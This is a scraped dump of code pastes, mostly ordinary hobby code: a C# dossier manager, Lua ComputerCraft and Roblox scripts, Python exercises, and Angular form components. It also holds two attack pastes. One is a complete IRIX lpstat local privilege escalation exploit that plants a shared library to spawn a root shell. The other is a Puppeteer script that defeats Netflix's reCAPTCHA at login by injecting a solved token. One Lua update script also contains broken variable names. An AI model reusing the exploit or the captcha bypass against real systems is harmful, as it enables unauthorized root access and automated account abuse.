            const string SeeAllDossierCommand = ""2"";
            const string DeleteDossierCommand = ""3"";
            const string SearchDossierCommand = ""4"";
            const string ExitCommand = ""5"";

            int arraySize = 0;
            string[] fullName = new string[arraySize];
            string[] positions = new string[arraySize];
            bool isWork = true;

            while (isWork)
            {
                Console.Clear();
                Console.WriteLine(""Введите желаемую команду.\n"");
                Console.WriteLine($""{AddDossierCommand} - Добавить досье"");
                Console.WriteLine($""{SeeAllDossierCommand} - Вывод всех досье на экран."");
                Console.WriteLine($""{DeleteDossierCommand} - Удалить досье"");
                Console.WriteLine($""{SearchDossierCommand} - Поиск досье по ФИО."");
                Console.WriteLine($""{ExitCommand} - Выйти из программы."");

                switch (Console.ReadLine())
                {
                    case AddDossierCommand:
                        AddDossier(ref fullName, ref positions);
                        break;

                    case SeeAllDossierCommand:
                        ShowAllDossier(positions, fullName);
                        break;

                    case DeleteDossierCommand:
                        DeleteDossier(ref fullName, ref positions);
                        break;

                    case SearchDossierCommand:
                        SearchDossier(fullName, positions);
                        break;

                    case ExitCommand:
                        isWork = false;
                        break;

                    default:
                        Console.WriteLine(""Введена неверная команда"");
                        break;
                }

                Console.WriteLine(""Нажмите любую кнопку чтобы продолжить..."");
                Console.ReadKey();
            }
        }

        private static void AddDossier(ref string[] names, ref string[] positions)
        {
            Console.WriteLine(""Введите ФИО сотрудника."");
            string name = Console.ReadLine();
            Console.WriteLine(""Введите должность сотрудника."");
            string position = Console.ReadLine();

            names = IncreasArray(names, name);
            positions = IncreasArray(positions, position);
        }

        private static string[] IncreasArray(string[] array, string text)
        {
            string[] tempArray = new string[array.Length + 1];

            for (int i = 0; i < array.Length; i++)
            {
                tempArray[i] = array[i];
            }

            tempArray[array.Length - 1] = text;
            array = tempArray;
            return array;
        }

        private static void ShowAllDossier(string[] positions, string[] fullNames)
        {
            int index = 1;

            for (int i = 0; i < positions.Length; i++)
            {
                Console.WriteLine($""({index}) ФИО: {fullNames[i]}. Должность: {positions[i]}."");
                index++;
            }
        }

        private static void DeleteDossier(ref string[] fullNames, ref string[] positions)
        {
            Console.Write(""Введите номер досье :"");
            int number = int.Parse(Console.ReadLine());

            if (number > 0 && number <= fullNames.Length)
            {
                int index = number - 1;
                fullNames = DecreaseArray(fullNames, index);
                positions = DecreaseArray(positions, index);
                Console.WriteLine($""Досье под номером {number} удалено!"");
            }
            else
            {
                Console.WriteLine(""Досье с таким номером не существует!!!"");
            }
        }

        private static string[] DecreaseArray(string[] array, int index)
        {
            string[] tempArray = new string[array.Length - 1];

            for (int i = 0; i < index; i++)
            {
                tempArray[i] = array[i];
            }

            for (int i = index; i < array.Length - 1; i++)
            {
                tempArray[i] = array[i + 1];
            }

            array = tempArray;
            return array;
        }

        private static void SearchDossier(string[] fullNames, string[] positions)
        {
            Console.WriteLine(""Введите фамилию для поиска досье"");
            string surname = Console.ReadLine();

            for (int i = 0; i < fullNames.Length; i++)
            {
                char delimiter = ' ';
                string[] split = fullNames[i].Split(delimiter);

                if (split[0].ToLower() == surname.ToLower())
                {
                    Console.WriteLine($""({i + 1}) ФИО : {fullNames[i]}. Должность : {positions[i]}"");
                    break;
                }
            }
        }
    }
}"
D3kHskvN,custom_update_file,EDDY_here,Lua,Saturday 24th of February 2024 11:05:51 PM CDT,"print('Make new update file give name:')

local FILENAME = ""/""..read().."".lua""

print('give git gist url example: https://gist.githubusercontent.com/{user}/{gist_id}/raw/{name}')
local git_gist = read()
ress,err = http.get(git_gist)

if not ress then error(err) end

local code = ress.readAll()

if not (fs.exists(FILENAME))
then
    local newHarvest = fs.open(FILENAME,'w')
    newHarvest.close()
end

local readfile = fs.open(FILENAME,'r')
local oldcode = readfile.readAll()
readfile.close()

local file = fs.open(FILENAME, 'w')
 
if oldCode == code
then
    file.write(oldCode)
    print('NO CHANGES MADE - Same Code')
else
    file.write(code)
    print('WRITING UPDATE')
    byteDiff = string.len(code) - string.len(oldCode)
 
    if byteDiff >= 0
    then
        print(tostring(math.abs(byteDiff)) .. ' bytes added')
    else
        print(tostring(math.abs(byteDiff)) .. ' bytes removed')
    end
end
 
file.close()
res.close()
"
KrBrgCVi,Untitled,MisterQuirk,Python,Saturday 24th of February 2024 11:02:49 PM CDT,"#Task 1

# n, m = int(input()), int(input())
# s = []
# s.append(n), s.append(m)
# print(sum(s))

#Task 2

# l = input()
# a = l.split()
# print(a[0], a[-1])

#Task 3


#Task 1

# n = int(input())
#
# for i in range(n + 1):
#     if i % 3 == 0 and i % 6 != 0:
#         print(i)

#Task 2

# n = int(input())
#
# for i in range(10, n + 1):
#     if i % 10 % 2 == 0:
#         print(i)

#Task 3

# n = int(input())
# s = 0
# k = 0
# if n % 2 == 0:
#     for i in range(1, n + 1):
#         if i % 2 == 0:
#             s += 1
#     print(s)
# else:
#     for i in range(1, n + 1):
#         if i % 2 != 0:
#             k += i
#     print(k)
# 50 2500

#Task 4

# n = int(input())
# k = 0
# if n % 3 == 0:
#     m = int(input())
#     for i in range(1, n + 1):
#         if i % m == 0:
#             k += 1
#     print(k)
# else:
#     for i in range(1, n + 1):
#         print(n**i)

#Task 5

# a, b, n = int(input()), int(input()), int(input())
# k = 0
# arr = []
# for i in range(n):
#     x = int(input())
#     arr.append(x)
# for i in range(n):
#     if a**2 + b**2 == arr[i]**2 and arr[i] > 10 and (arr[i] % 3 == 0 or arr[i] % 4 == 0):
#         k += 1
# print(k)
"
4jea8swC,CloudStreamPlugins - CS3xxx,Freitez93,JSON,Saturday 24th of February 2024 10:59:52 PM CDT,"{
    ""name"": ""Repository of CS3xxx"",
    ""description"": ""Repository Adult (+18) of CS3xxx"",
    ""manifestVersion"": 1,
    ""pluginLists"": [
        ""https://raw.githubusercontent.com/Freitez93/my_Biblioteca/main/CS3xxx-Ext.json""
    ]
}"
p0cEUjYz,flyto,Jpaul999,Lua,Saturday 24th of February 2024 10:50:26 PM CDT,"-- Retrieve command line arguments
local args = {...}

-- Check if there are three arguments provided
if #args ~= 3 then
    print(""Usage: lua fly_and_return.lua <x> <y> <z>"")
    return
end

-- Convert arguments to numbers
local x, y, z = tonumber(args[1]), tonumber(args[2]), tonumber(args[3])

-- Function to fly to specific coordinates
local function flyTo(x, y, z)
    local startX, startY, startZ = gps.locate()
    if not startX then
        print(""Error: Could not determine current position."")
        return
    end
    
    local deltaX, deltaY, deltaZ = x - startX, y - startY, z - startZ
    
    -- Move along X-axis
    if deltaX > 0 then
        turtle.turnRight()
        for _ = 1, deltaX do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
        turtle.turnLeft()
    elseif deltaX < 0 then
        turtle.turnLeft()
        for _ = 1, math.abs(deltaX) do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
        turtle.turnRight()
    end
    
    -- Move along Y-axis
    local currentY = startY
    while currentY < y do
        while not turtle.up() do
            sleep(0.5)
        end
        currentY = currentY + 1
    end
    while currentY > y do
        while not turtle.down() do
            sleep(0.5)
        end
        currentY = currentY - 1
    end
    
    -- Move along Z-axis
    if deltaZ > 0 then
        for _ = 1, deltaZ do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
    elseif deltaZ < 0 then
        turtle.turnAround()
        for _ = 1, math.abs(deltaZ) do
            while not turtle.forward() do
                sleep(0.5)
            end
        end
    end
end

-- Function to return to the start position
local function returnToStart()
    local startX, startY, startZ = gps.locate()
    if not startX then
        print(""Error: Could not determine current position."")
        return
    end
    
    flyTo(startX, startY, startZ)
end

-- Fly to the specified coordinates
flyTo(x, y, z)

-- Perform actions at the destination

-- Return to the starting position
returnToStart()
"
UAUdUY09,GPS,Alexr360,Lua,Saturday 24th of February 2024 10:00:45 PM CDT,"term.clear()
term.setCursorPos(1, 1)
shell.run(""gps"",""host"",x,y,z)"
XaBiTyEn,Untitled,kestorm,Lua,Saturday 24th of February 2024 09:48:02 PM CDT,"local display = {}

local insertService = game:GetService('InsertService')
local tweenService = game:GetService('TweenService')
local marketplaceService = game:GetService('MarketplaceService')
local serverStorage = game:GetService('ServerStorage')

local allModelsLoaded = false

local appliedPartsWithInfo = {} -- used to store parts with already existing configurations in case of reiteration problems

local rotationInfo = TweenInfo.new(
	3,
	Enum.EasingStyle.Linear
)

local hoverInfo = TweenInfo.new(
	3,
	Enum.EasingStyle.Sine,
	Enum.EasingDirection.InOut
)

local function setRotationLoop(part : BasePart)
	while true do
		tweenService:Create(part, rotationInfo, {Orientation = Vector3.new(0,360,0)}):Play()
		task.wait(3)
	end
	print('setup rotation loop')
end

local function setHoverLoop(part : BasePart)
	while true do
		tweenService:Create(part, hoverInfo, {Position = part.Position + Vector3.new(0,2,0)}):Play()
		task.wait(3)
		tweenService:Create(part, hoverInfo, {Position = part.Position - Vector3.new(0,2,0)}):Play()
		task.wait(3)
	end
	print('setup hover loop')
end

local function setupDisplayItem(part : BasePart, id : number)
	print('setting up dispplay items')
	
	local newMesh = Instance.new('SpecialMesh', part)
	
	local texture = 0
	local mesh = 0
	
	local function getMeshTexInfo(asset)
		if asset:FindFirstChildOfClass('BasePart') then
			local handle = asset:FindFirstChildOfClass('BasePart')
			if handle:FindFirstChildOfClass('SpecialMesh') then
				print('specialmesh')
				texture = 'rbxassetid://'..asset:FindFirstChildOfClass('SpecialMesh').TextureId
				mesh = 'rbxassetid://'..asset:FindFirstChildOfClass('SpecialMesh').MeshId
			elseif handle:IsA('MeshPart') then
				print('meshpart')
				print(handle.TextureId)
				print(handle.MeshId)
				texture = 'rbxassetid://'..handle.TextureID
				mesh = 'rbxassetid://'..handle.MeshId
			end
		end
	end
	print('got func')
	
	repeat -- makes sure this won't error when trying to collect information on the display items
		task.wait(0.05)
	until allModelsLoaded == true
	print('all models are loaded!')
	
	local displayModelStorage = serverStorage:WaitForChild('DisplayModels')
	
	for _, v in pairs(displayModelStorage:GetChildren()) do
		if v:GetAttribute('AssetNum') == id then
			task.spawn(function()
				getMeshTexInfo(v)
			end)
			print(texture)
			print(mesh)
		end
	end
	
	newMesh.TextureId = texture
	newMesh.MeshId = mesh
end

local function setupMarketInformation(part : BasePart, id : number) -- will duplicate a billboardgui into part and configure information so yah
	-- do stuff
end

function display.createDisplayItems(folder : Folder)
	local assetNumber = 0
	local spawnedFolder = Instance.new('Folder', serverStorage)
	spawnedFolder.Name = 'DisplayModels'
	
	for _, part in pairs(folder:GetChildren()) do
		if part:IsA('BasePart') and part:GetAttribute('AssetId') then
			assetNumber = tonumber(part:GetAttribute('AssetId'))
			local insertModel = insertService:LoadAsset(assetNumber)
			insertModel.Parent = spawnedFolder
			print('added '..insertModel.Name..' to display item folder')
			local newId = insertModel:SetAttribute('AssetNum', assetNumber)
			print(assetNumber)
		end
	end
	allModelsLoaded = true
	print('created server models. waiting for replication on the client!')
end

function display.test(part : BasePart)
	if part:GetAttribute('AssetId') then
		setupDisplayItem(part, part:GetAttribute('AssetId'))
	else
		print('does not have asset id attribute')
	end
end

return display"
VdGM9YmH,Q to TP,LSJiqueue,Lua,Saturday 24th of February 2024 09:45:00 PM CDT,"local localPlayer = game:GetService(""Players"").LocalPlayer
local mouse = localPlayer:GetMouse()
local uis = game:GetService(""UserInputService"")
local hotkey = ""Q"" -- must be capital letter
uis.InputBegan:Connect(function(i, gp)
	if gp then return end 
	if i.KeyCode == Enum.KeyCode[hotkey] then 
		localPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame = mouse.Hit + Vector3.new(0, 1, 0)
	end
end)"
u9kCxUmZ,manager,ChickenSquiggles,Lua,Saturday 24th of February 2024 09:42:51 PM CDT,"local pf = peripheral.wrap(""left"")
 
 
 
while true do
    sleep()
    local players = pf.getPlayersInRange(10)
 
    for _,v in ipairs(players) do
        commands.exec(""effect give ""..v.."" minecraft:resistance 20 255"") 
        commands.exec(""tp ""..v.."" ""..math.random(4294,6293).."" 200 ""..math.random(-1470,529))
    end
 
end"
Jx9GnKhR,Turtle Fuel,Alexr360,Lua,Saturday 24th of February 2024 09:32:38 PM CDT,"-- Function to refuel the turtle
function refuel()
    -- Loop over each slot in the turtle's inventory
    for i = 1, 16 do
        -- Select the slot
        turtle.select(i)

        -- If the selected slot contains an item, try to refuel with it
        if turtle.getItemCount(i) > 0 then
            turtle.refuel(1)
        end
    end

    -- Print out the turtle's current fuel level
    print(""Current fuel level: "" .. turtle.getFuelLevel())
end

-- Call the refuel function
refuel()
"
qCnhzfeD,IRIX 5.3/6.2/6.3/6.4/6.5/6.5.11 - '/usr/bin/lpstat' Local Overflow / Local Privilege Escalation,FlyFar,Bash,Saturday 24th of February 2024 09:28:25 PM CDT,"#!/bin/sh
## copyright LAST STAGE OF DELIRIUM jul 2000 poland            *://lsd-pl.net/ #
## /usr/bin/lpstat                                                             #

EXECUTABLE=/usr/bin/lpstat
FILE=file
LIBRARY=lsd
DIRECTORY=tmp

cd $DIRECTORY
cat > $FILE << 'EOF'
HOSTNAME=localhost
HOSTPRINTER=bzzz-z
EOF
echo NETTYPE=../../../../$DIRECTORY/lsd >> $FILE
chmod 666 $FILE
cat > $LIBRARY.c << 'EOF'
OpenConn(){
    printf(""copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\n"");
    printf(""/usr/bin/lpstat for irix 5.3 6.2 6.3 6.4 6.5 6.5.11 IP:all\n"");
    printf(""\n"");
    setreuid(getuid(),0);setuid(0);setgid(0);
    execl(""/bin/sh"",""sh"",0);
}
CloseConn(){} ListPrinters(){} SendJob(){} CancelJob(){} WaitForJob(){}
GetQueue(){} StartTagging(){} StopTagging(){} Install(){} AddTimeout(){}
RemoveSemiColons(){} CreateInterface(){} InstallPrinter(){}
InstallIcon(){} SockRead(){} IsDest(){} BSDSendJob(){} ListAllPrinters(){}
EOF
cc -c $LIBRARY.c -c -o $LIBRARY.o
ld -shared $LIBRARY.o -o $LIBRARY.so
rm -rf $LIBRARY.[co] so_locations
if [ ! -f ""$LIBRARY.so"" ]
    then
    echo ""error: building library""
    exit 1
fi
chmod 666 $LIBRARY.so

$EXECUTABLE -n ../../../../../$DIRECTORY/$FILE

# milw0rm.com [2001-05-07]
            "
PY3u6Nt9,Lantern Replacement Program,Alexr360,Lua,Saturday 24th of February 2024 09:25:44 PM CDT,"-- Define the target coordinates
local targets = {
    {x=614, y=169, z=-580},
    {x=616, y=196, z=587},
    -- Add more coordinates as needed
}

-- Define the initial position of the turtle
local position = {x=616, y=196, z=587}

-- Function to move the turtle to a specific coordinate
function moveTo(target)
    -- Calculate the difference between the current and target positions
    local dx = target.x - position.x
    local dy = target.y - position.y
    local dz = target.z - position.z

    -- Move along the x-axis
    for i=1, math.abs(dx) do
        if dx > 0 then
            turtle.forward()
        else
            turtle.back()
        end
    end

    -- Move along the y-axis
    for i=1, math.abs(dy) do
        if dy > 0 then
            turtle.up()
        else
            turtle.down()
        end
    end

    -- Move along the z-axis
    for i=1, math.abs(dz) do
        if dz > 0 then
            turtle.turnRight()
            turtle.forward()
            turtle.turnLeft()
        else
            turtle.turnLeft()
            turtle.forward()
            turtle.turnRight()
        end
    end

    -- Update the current position
    position = target
end

-- Function to mine and replace a block
function mineAndReplace()
    -- Mine the block beneath the turtle
    turtle.digDown()

    -- Select the first slot in the inventory
    turtle.select(1)

    -- Place a block beneath the turtle
    turtle.placeDown()
end

-- Function to check for and avoid obstacles
function avoidObstacles()
    -- If there's an obstacle in front of the turtle
    if turtle.detect() then
        -- Move up to avoid it
        turtle.up()
    end
end

-- Main program
function main()
    -- For each target coordinate
    for i, target in ipairs(targets) do
        -- Move to the target coordinate
        moveTo(target)

        -- Check for and avoid obstacles
        avoidObstacles()

        -- Mine and replace the block beneath the turtle
        mineAndReplace()
    end
end

-- Run the main program
main()
"
u967TY85,Untitled,adrio12,Lua,Saturday 24th of February 2024 09:21:57 PM CDT,"local function testHTTPRequest()
    local url = ""http://worldtimeapi.org/api/timezone/Etc/UTC""
    local response = http.get(url)

    if response then
        local data = response.readAll()
        print(""Odpowiedź z serwera: "", data)
        response.close()
    else
        print(""Nie można nawiązać połączenia z serwerem."")
    end
end

testHTTPRequest()
"
xw1HTt02,template,didkoslawow,HTML,Saturday 24th of February 2024 09:13:21 PM CDT,"<div class=""form__container"">
    <div class=""form__container--content"">
        <h2 class=""form__container--content-heading subheading"">
            {{headingText}}
        </h2>
        <form [formGroup]=""formModel.form"" class=""form__container--content-form"" (ngSubmit)=""onSubmit()"">
            @if (isRegistrationForm() && !isLoginForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""firstName""
                    class=""form__container--content-controls-input"" formControlName=""firstName"" />
                <label for=""firstName"" class=""form__container--content-controls-label"">First Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""lastName""
                    class=""form__container--content-controls-input"" formControlName=""lastName"" />
                <label for=""lastName"" class=""form__container--content-controls-label"">Last Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""avatar"" class=""form__container--content-controls-input""
                    formControlName=""avatar"" />
                <label for=""avatar"" class=""form__container--content-controls-label"">Avatar</label>
            </div>
            }
            @if(isLoginForm() || isRegistrationForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""email"" class=""form__container--content-controls-input""
                    formControlName=""email"" />
                <label for=""email"" class=""form__container--content-controls-label"">Email</label>
            </div>
            <div class=""form__container--content-controls"">
                <input placeholder=""placeholder"" id=""password"" class=""form__container--content-controls-input""
                    type=""password"" formControlName=""password"" />
                <label for=""password"" class=""form__container--content-controls-label"">Password</label>
            </div>
            }
            @if (isRegistrationForm()){
            <div class=""form__container--content-controls"">
                <input placeholder=""placeholder"" id=""rePass"" class=""form__container--content-controls-input""
                    type=""password"" formControlName=""rePassword"" />
                <label for=""rePass"" class=""form__container--content-controls-label"">Re Password</label>
            </div>
            <p class=""form__container--content-form-link"">Already have an account? <a routerLink=""/auth/login""
                    class=""link"">Sign in here!</a></p>
            } @else if(isLoginForm()) {
            <p class=""form__container--content-form-link"">Don't have and account? <a routerLink=""/auth/register""
                    class=""link"">Sign up here!</a></p>
            }
            @if(isRecipeEditForm() || isRecipeCreateForm()) {
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""name"" class=""form__container--content-controls-input""
                    formControlName=""name"" />
                <label for=""name"" class=""form__container--content-controls-label"">Name</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""prepTime""
                    class=""form__container--content-controls-input"" formControlName=""prepTime"" />
                <label for=""prepTime"" class=""form__container--content-controls-label"">Prep Time (min)</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""cookTime""
                    class=""form__container--content-controls-input"" formControlName=""cookTime"" />
                <label for=""cookTime"" class=""form__container--content-controls-label"">Cook Time (min)</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""img"" class=""form__container--content-controls-input""
                    formControlName=""img"" />
                <label for=""img"" class=""form__container--content-controls-label"">Image</label>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""ingredient""
                    class=""form__container--content-controls-input"" formControlName=""ingredient"" />
                <label for=""ingredient"" class=""form__container--content-controls-label"">Ingredient</label>
                <button type=""button"" class=""form__container--content-controls-btn"" (click)=""onAddIngredient()""><fa-icon
                        [icon]=""faBtn"" /></button>
            </div>
            <div class=""form__container--content-controls form__container--content-controls-qty"">
                <fa-icon [icon]=""faList"" />
                <input type=""text"" name=""quantity"" id=""quantity"" formControlName=""quantity"">
                <fa-icon [icon]=""faSpoon"" />
                <select name=""unit"" id=""unit"" formControlName=""unit"">
                    <option value="""" disabled selected>Units</option>
                    @for(unit of units; track unit) {
                    <option [ngValue]=""unit"">{{unit}}</option>
                    }
                </select>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""steps"" class=""form__container--content-controls-input""
                    formControlName=""steps"" />
                <label for=""steps"" class=""form__container--content-controls-label"">Cooking Steps</label>
                <button type=""button"" class=""form__container--content-controls-btn"" (click)=""onAddStep()""><fa-icon
                        [icon]=""faBtn"" /></button>
            </div>
            <div class=""form__container--content-controls"">
                <input type=""text"" placeholder=""placeholder"" id=""description""
                    class=""form__container--content-controls-input"" formControlName=""description"" />
                <label for=""description"" class=""form__container--content-controls-label"">Cooking Description</label>
            </div>
            }
            <input class=""form__container--content-form-btn btn btn--full"" type=""submit"" [value]=""buttonText"" />
        </form>
        <div [ngClass]=""ingredients.length || steps.length ? 'opened' : ''"" class=""form__container--content-info"">
            <div class=""ingredients"">
                <p class=""ingredients__heading"">Ingredients</p>
                <ul class=""ingredients__list"">
                    @for (ingredient of ingredients; track ingredient) {
                    <li (click)=""onEditIngredient(ingredient)"" class=""ingredients__list--item"">
                        <span>{{ingredient.name}}</span> <span>{{ingredient.ProductRecipe.quantity}}
                            {{ingredient.ProductRecipe.unit}}</span>
                    </li>
                    }
                </ul>
            </div>
            <div class=""steps"">
                <p class=""steps__heading"">Steps</p>
                <ul class=""steps__list"">
                    @for (step of steps; track step) {
                    <li (click)=""onEditSteps(step)"" class=""steps__list--item"">{{step}}</li>
                    }
                </ul>
            </div>
        </div>
    </div>
</div>"
HgWTd8LS,component,didkoslawow,TypeScript,Saturday 24th of February 2024 09:11:33 PM CDT,"import { CommonModule } from '@angular/common';
import {
  Component,
  EventEmitter,
  Input,
  OnInit,
  Output,
  SimpleChanges,
} from '@angular/core';
import { FormControl, ReactiveFormsModule } from '@angular/forms';
import { GenericFormData, GenericFormModel } from './generic-form.model';
import { RouterLink } from '@angular/router';
import { faListOl, faPlus, faSpoon } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeModule } from '@fortawesome/angular-fontawesome';
import {
  Ingredient,
  IngredientWithId,
  Recipe,
  RecipeData,
} from '../../recipes/recipe.model';

@Component({
  selector: 'app-generic-form',
  standalone: true,
  imports: [CommonModule, ReactiveFormsModule, RouterLink, FontAwesomeModule],
  templateUrl: './generic-form.component.html',
  styleUrl: './generic-form.component.scss',
})
export class GenericFormComponent implements OnInit {
  @Input() formData!: GenericFormData;
  @Input() formType!:
    | 'registration'
    | 'login'
    | 'create recipe'
    | 'edit recipe';
  @Input() recipe: Recipe = {};
  @Input() ingredients: Ingredient[] = [];
  @Input() steps: string[] = [];
  @Input() units: string[] = [];

  @Output() formSubmit = new EventEmitter<GenericFormData>();
  @Output() addIngredient = new EventEmitter<Ingredient[]>();
  @Output() updateIngredients = new EventEmitter<Ingredient[]>();
  @Output() addStep = new EventEmitter<string>();
  @Output() updateSteps = new EventEmitter<string[]>();

  buttonText!: string;
  headingText!: string;
  formModel!: GenericFormModel;
  ingredientToEdit!: IngredientWithId | undefined;

  faBtn = faPlus;
  faSpoon = faSpoon;
  faList = faListOl;

  ngOnChanges(changes: SimpleChanges): void {
    if ('recipe' in changes && this.isRecipeEditForm()) {
      this.populateFormWithRecipeData();
    }
  }

  populateFormWithRecipeData(): void {
    this.formModel.form.patchValue({
      name: this.recipe.name,
      prepTime: this.recipe.prepTime,
      cookTime: this.recipe.cookTime,
      img: this.recipe.img,
      description: this.recipe.description,
    });
  }

  ngOnInit(): void {
    this.formModel = new GenericFormModel(this.formData);
    this.formModel.form.addControl('ingredients', new FormControl(''));

    this.headingText = this.isRegistrationForm()
      ? 'Sign Up for a Delicious Journey'
      : this.isLoginForm()
      ? ""Let's Get Cooking""
      : this.isRecipeCreateForm()
      ? 'Design your recipe'
      : this.isRecipeEditForm()
      ? 'Redesign your recipe'
      : '';

    this.buttonText = this.isRegistrationForm()
      ? 'Sign Up'
      : this.isLoginForm()
      ? 'Sign In'
      : this.isRecipeCreateForm()
      ? 'Create'
      : this.isRecipeEditForm()
      ? 'Edit'
      : '';
  }

  isRegistrationForm(): boolean {
    return this.formType === 'registration';
  }

  isLoginForm(): boolean {
    return this.formType === 'login';
  }

  isRecipeEditForm(): boolean {
    return this.formType === 'edit recipe';
  }

  isRecipeCreateForm(): boolean {
    return this.formType === 'create recipe';
  }

  onAddIngredient(): void {
    const ingredientControl = this.formModel.form.get('ingredient');
    const quantityControl = this.formModel.form.get('quantity');
    const unitControl = this.formModel.form.get('unit');

    if (
      ingredientControl &&
      ingredientControl.value &&
      quantityControl &&
      quantityControl.value &&
      unitControl &&
      unitControl.value
    ) {
      const ingredient = {
        id: this.ingredientToEdit?.id,
        name: ingredientControl.value,
        ProductRecipe: {
          quantity: quantityControl.value,
          unit: unitControl.value,
        },
      };

      this.ingredients = this.ingredients.filter(
        (i) => i.name !== ingredient.name
      );

      this.addIngredient.emit([...this.ingredients, ingredient]);

      ingredientControl?.setValue('');
      quantityControl?.setValue('');
      unitControl?.setValue('');
    }
  }

  onEditIngredient(ingredient: Ingredient): void {
    const ingredientControl = this.formModel.form.get('ingredient');
    const quantityControl = this.formModel.form.get('quantity');
    const unitControl = this.formModel.form.get('unit');

    this.ingredientToEdit = this.ingredients.find((i) => {
      return i.name === ingredient.name;
    });

    this.ingredients = this.ingredients.filter(
      (i) => i.name !== ingredient.name
    );

    this.updateIngredients.emit([...this.ingredients]);

    ingredientControl?.setValue(ingredient.name);
    quantityControl?.setValue(ingredient.ProductRecipe.quantity);
    unitControl?.setValue(ingredient.ProductRecipe.unit);
  }

  onAddStep(): void {
    const stepsControl = this.formModel.form.get('steps');

    if (stepsControl && stepsControl.value) {
      this.addStep.emit(stepsControl.value);
      stepsControl.setValue('');
    }
  }

  onEditSteps(item: string): void {
    const stepsControl = this.formModel.form.get('steps');

    this.steps = this.steps.filter((i) => i !== item);
    this.updateSteps.emit([...this.steps]);

    stepsControl?.setValue(item);
  }

  onSubmit(): void {
    const formData = this.formModel.form.value;

    if (this.isRecipeEditForm()) {
      const updatedRecipe: Recipe = {
        name: formData.name,
        prepTime: formData.prepTime,
        cookTime: formData.cookTime,
        img: formData.img,
        ingredients: this.ingredients,
        steps: this.steps,
        description: formData.description,
      };

      this.formSubmit.emit(updatedRecipe);
    } else {
      this.formSubmit.emit(formData);
    }
  }
}
"
7aymVX0E,Bypass netflix.com Enterprise Recaptcha V3 at sign-in page,FlyFar,JavaScript,Saturday 24th of February 2024 09:00:06 PM CDT,"//npm install puppeteer fs @antiadmin/anticaptchaofficial
// update your login credentials
// run with command: ""node netflix.js""

//IMPORTANT:
//1. Netflix utilizes Enterprise Recaptcha V3
//2. We use their obfuscated script located at https://codex.nflxext.com/*** CDN.
//   We modify it a little to add a function ""getMyToken"" at the place where they use token from Google.
//   In case of script modifcations, you may add this function yourself.
//   This function simply returns V3 Enterprise token which we substitute after solving it in Anti Captcha.
//3. Netflix login and password are required to test this script.
//4. Several attempts (about 10 times) should be made to sign in successfully.

const anticaptcha = require(""@antiadmin/anticaptchaofficial"");
const pup = require(""puppeteer"");
const fs = require('fs');


//API key for anti-captcha.com
const anticaptchaAPIKey = 'API_KEY_HERE';

//access data
const url = 'https://www.netflix.com/login';
const login = 'your@email.com';
const password = 'password';

let browser = null;
let page = null;
let token = null;



(async () => {

    anticaptcha.setAPIKey(anticaptchaAPIKey);
    const balance = await anticaptcha.getBalance();
    if (balance <= 0) {
        console.log('Buy your anticaptcha balance!');
        return;
    } else {
        console.log('API key balance is '+balance+', continuing');
        // anticaptcha.shutUp(); //uncomment for silent captcha recognition
    }

    try {
        console.log('opening browser ..');


        let options = {
            headless: false,
            ignoreHTTPSErrors: true,
            devtools: true
        };
        console.log(options);
        browser = await pup.launch(options);


        console.log('creating new page ..');
        page = await browser.newPage();
    } catch (e) {
        failCallback(""could not open browser: ""+e);
        return false;
    }


    await page.setRequestInterception(true);
    page.on('request', (request) => {
        if (request.url().indexOf('none') !== -1 && request.url().indexOf('js') !== -1 && request.url().indexOf('components') !== -1) {
            console.log('aborting '+request.url());
            request.abort();
        } else {
            request.continue();
        }
    });
    page.on('response', (response) => {
        if (response.url().indexOf('login') !== -1 && response.request().method() === 'POST') {
            console.log(""\n\n==== captcha check response ====\n\n"");
            console.log('status: '+response.status());
            if (response.status() !== 302) {
                failCallback(""captcha result not accepted"");
            } else {
                successCallback(""successfully passed test"");
            }
        }
    });

    console.log('solving captcha');

    try {
        token = await anticaptcha.solveRecaptchaV3Enterprise(url,'6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR',0.9,'');
    } catch (e) {
        failCallback(""could not solve captcha"");
        return;
    }

    console.log('token is ready: '+token);


    try {
        await page.goto(url, {
            waitUntil: ""domcontentloaded""
        });
    } catch (e) {
        console.log('err while loading the page: '+e);
    }

    // await delay(5000);


    console.log('adding modifed script');
    try {

        const path = require('path');
        let file = fs.readFileSync(path.resolve('.', '_netflix.js'), 'utf8');
        file = file.replace('RECAPTCHA_TOKEN', token);
        await page.addScriptTag({ content: file });
    } catch (e) {
        console.log('failed to insert script: '+e);
    }

    await delay(3000);

    console.log('filling form ..');

    const loginInput= await page.$(`#id_userLoginId`)
    await loginInput.focus();
    await page.type(`#id_userLoginId`,login)

    await delay(1000);

    const passwordInput= await page.$(`#id_password`)
    await passwordInput.focus();
    await page.type(`#id_password`,password)


    await delay(1000);

    console.log('clicking the button');

    await Promise.all([
        page.click(""#appMountPoint > div > div.login-body > div > div > div.hybrid-login-form-main > form > button""),
        page.waitForNavigation({ waitUntil: 'networkidle0' }),
    ]);



})();



function delay(time) {
   return new Promise(function(resolve) {
       setTimeout(resolve, time)
   });
}



function successCallback() {
    console.log('Successfully passed: ');
    // console.log('closing browser .. ');
    // browser.close();
}

function failCallback(code) {
    console.log('Failed to pass: '+code);
    // console.log('closing browser .. ');
    // browser.close();
}
"
